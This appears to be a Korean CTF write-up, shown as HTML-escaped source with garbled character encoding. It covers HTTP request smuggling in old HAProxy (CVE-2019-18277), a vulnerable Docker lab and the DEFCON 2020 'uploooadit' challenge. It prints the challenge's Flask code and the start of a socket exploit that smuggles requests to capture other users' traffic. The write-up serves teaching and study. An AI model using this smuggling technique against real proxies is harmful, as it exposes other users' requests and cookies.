&lt;h2 id=&quot;4-ì‹¤ìŠµ-í™˜ê²½-êµ¬ì„±&quot;&gt;4. ì‹¤ìŠµ í™˜ê²½ êµ¬ì„±&lt;/h2&gt;

&lt;p&gt;2.0.6 ì´ì „ ë²„ì „ì˜ HAProxyì—ì„œ HTTP Request Smuggling ì·¨ì•½ì (CVE-2019-18277)ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.  HAProxyëŠ” Transfer-Encodingì´ ì¡´ì¬í•˜ëŠ” ê²½ìš° Transfer-Encodingë¥¼ ë¨¼ì € êµ¬ë¬¸ ë¶„ì„í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ Transfer-Encoding í—¤ë”ì— ê°œí–‰ë¬¸ì(\x0b)ë¥¼ í¬í•¨í•˜ì—¬ ì „ì†¡í•  ê²½ìš° Transfer-Encoding ë°©ì‹ì´ ì‘ë™í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ HTTP Request Smuggling ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ Transfer-Encoding í—¤ë”ì— ê°œí–‰ë¬¸ì(\x0b)ë¥¼ í¬í•¨í•˜ì—¬ Transfer-Encoding ë°©ì‹ì´ ì‘ë™í•˜ì§€ ì•Šë„ë¡ í•˜ì˜€ìœ¼ë¯€ë¡œ TE-TE ë°©ì‹ìœ¼ë¡œ êµ¬ë¶„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;HTTP Request Smuggling ì·¨ì•½ì ì˜ ê²½ìš° ëª‡ ê°œì˜ ì·¨ì•½ì ê³¼ ì—°ê³„í•˜ì—¬ ê³µê²©í•  ê²½ìš° íŒŒê¸‰ë ¥ì´ ê¸°í•˜ê¸‰ìˆ˜ì ìœ¼ë¡œ ìƒìŠ¹í•©ë‹ˆë‹¤. ê³µê²© ë²”ìœ„ ë˜í•œ í•´ë‹¹ ì‚¬ì´íŠ¸ë¥¼ ì‚¬ìš©í•˜ëŠ” ì‚¬ìš©ì ë¶ˆíŠ¹ì • ë‹¤ìˆ˜ì—ê²Œ ë¬´ë¶„ë³„í•˜ê²Œ ë°œìƒí•˜ë©° ìœ ì € ìƒí˜¸ì‘ìš© ì—†ì´ ë‹¨ìˆœ ì‚¬ì´íŠ¸ ì´ìš©ë§Œìœ¼ë¡œë„ XSS ì·¨ì•½ì ì´ ë°œìƒí•˜ì—¬ ì¿ í‚¤/ì„¸ì…˜ì´ íƒˆì·¨ë˜ê±°ë‚˜, CSRFì™€ ê°™ì´ ì‚¬ìš©ìë¡œ í•˜ì—¬ê¸ˆ ì‚¬ì´íŠ¸ ë‚´ ì¡´ì¬í•˜ëŠ” ê¸°ëŠ¥ì„ í†µí•´ ì–´ë– í•œ í–‰ìœ„ë¥¼ í•˜ë„ë¡ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/13358a35-99fe-4255-a8da-1a9cb8eb2178/0e9b3fa9-8c6b-4395-a95c-0d21ea242cda.zip&quot;&gt;smuggling_example.zip&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ìœ„ëŠ” ì§ì ‘ dockerë¥¼ ì´ìš©í•˜ì—¬ ì‹¤ìŠµ í™˜ê²½ì„ êµ¬ì„±í•œ íŒŒì¼ ì…ë‹ˆë‹¤. docker-compose up ëª…ë ¹ì„ í†µí•´ ì‹¤í–‰í•  ìˆ˜ ìˆìœ¼ë©° 7979 í¬íŠ¸ë¡œ ì ‘ì†í•˜ì‹œë©´ ë©ë‹ˆë‹¤. í¬íŠ¸ë¥¼ ë³€ê²½í•˜ì‹œê³  ì‹¶ìœ¼ì‹œë©´ docker-compose.yml íŒŒì¼ ë‚´ ports ë¶€ë¶„ì˜ â€œ7979:1080â€ë¥¼ ë³€ê²½í•˜ì—¬ ì‚¬ìš©í•˜ì‹œë©´ ë©ë‹ˆë‹¤. ì¶”ê°€ì ìœ¼ë¡œ flask ì›¹ ì–´í”Œë¦¬ì¼€ì´ì…˜ì— XSS ì·¨ì•½ì ê³¼ URL redirect ì·¨ì•½ì ì„ êµ¬í˜„í•´ë‘ì—ˆìœ¼ë‹ˆ í•´ë‹¹ ì·¨ì•½ì ì„ ì—°ê³„í•˜ì—¬ í…ŒìŠ¤íŠ¸ í•˜ì…”ë„ ì¢‹ì„ ê²ƒ ê°™ìŠµë‹ˆë‹¤. ë˜í•œ, &lt;a href=&quot;https://portswigger.net/web-security/request-smuggling&quot;&gt;https://portswigger.net/web-security/request-smuggling&lt;/a&gt;ì—ë„ ê° ê³µê²©ê¸°ë²• ë³„ë¡œ ì‹¤ìŠµí•´ë³¼ ìˆ˜ ìˆëŠ” Labì´ ì¡´ì¬í•˜ë‹ˆ ì°¸ê³ í•˜ì‹œë©´ ë§ì€ ë„ì›€ì´ ë  ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;5-ë¬¸ì œí’€ì´&quot;&gt;5. ë¬¸ì œí’€ì´&lt;/h2&gt;

&lt;p&gt;5/16ë¶€í„° 5/18ê¹Œì§€ 3ì¼ê°„ ì§„í–‰í•œ DEFCON 2020 ì˜ˆì„ ì—ì„œ ìµœì‹  íŠ¸ë Œë“œì¸ HTTP Request Smuggling ì·¨ì•½ì ì„ ì´ìš©í•œ ë¬¸ì œê°€ ì¶œì œë˜ì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/3c51c62f-aab9-4183-a1b1-d25e89dff6b6/14816820-6349-47c7-ba03-641eb1809963.py&quot;&gt;app.py&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/0378a9f3-87cf-4126-a74a-35fd323f9baa/4b8b26b9-3f04-4e5f-aebb-e590db509e5b.py&quot;&gt;store.py&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;abort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;store&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;GUID_RE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;compile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;r&quot;\A[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\Z&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAX_CONTENT_LENGTH&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;filestore&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;S3Store&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Uncomment the following line for simpler local testing of this service
# filestore = store.LocalStore()
&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/files/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;text/plain&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;abort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;422&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;guid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-guid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GUID_RE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;guid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;abort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;422&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;filestore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;guid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;201&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/files/&amp;lt;guid&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;guid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GUID_RE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;guid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;abort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;422&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filestore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;guid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;text/plain&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NotFound&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;abort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;204&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;app.pyë¥¼ ë¶„ì„í•´ë³´ë©´ í¬ê²Œ íŒŒì¼ì„ ì €ì¥í•˜ëŠ” ê¸°ëŠ¥ê³¼ íŒŒì¼ì„ ì½ëŠ” ê¸°ëŠ¥ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ì €ì¥í•  ë•Œ X-guid í—¤ë”ì— íŒŒì¼ì„ ì‹ë³„í•  ìˆ˜ ìˆëŠ” ê³ ìœ ë²ˆí˜¸ë¥¼ uuid í¬ë§· í˜•ì‹ìœ¼ë¡œ ì…ë ¥í•˜ê²Œ ë˜ë©´ íŒŒì¼ì´ ì €ì¥ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/93be687b-4ece-452c-ac1b-db30211c563f/ca0a7872-66f3-49cc-83ba-0139a882b338.png&quot; alt=&quot;/assets/93be687b-4ece-452c-ac1b-db30211c563f/ca0a7872-66f3-49cc-83ba-0139a882b338.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ìœ„ì™€ ê°™ì´ íŒ¨í‚· í˜•ì‹ì„ ì˜¬ë°”ë¥´ì§€ ì•Šê²Œ ì „ì†¡í•  ê²½ìš° 400 (Bad Request) ìƒíƒœ ì½”ë“œë¡œ ì‘ë‹µê³¼ í•¨ê»˜ í—¤ë”ì— haproxy 1.9.10 ë²„ì „ì´ í¬í•¨ë˜ì–´ ì „ì†¡ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. HAProxyëŠ” 2.0.6 ì´ì „ ë²„ì „ì—ì„œ HTTP Request Smuggling ì·¨ì•½ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ HTTP request smuggling ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ /files/ ê²½ë¡œì— X-guid í—¤ë”ë¥¼ í¬í•¨í•˜ì—¬ ì „ì†¡í•˜ë©´ íƒ€ì¸ì´ ìš”ì²­í•œ HTTP request íŒ¨í‚·ì„ íŒŒì¼ë¡œ ì €ì¥ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib.parse&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlparse&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSLContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PROTOCOL_TLSv1_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s_sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wrap_socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server_hostname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;102400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;href&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'https://uploooadit.oooverflow.io/files/'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netloc&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;second_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'POST /files/ HTTP/1.1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;second_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'Content-Type: text/plain&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;second_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'X-guid: 22099301-d68e-4dfb-996f-1626f3158b5e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;second_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'Content-Length: 100&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;second_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'X-Foo: bar&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;smuggle_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'POST /files/ HTTP/1.1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;smuggle_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'Host: uploooadit.oooverflow.io&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;smuggle_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'Content-Type: text/plain&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
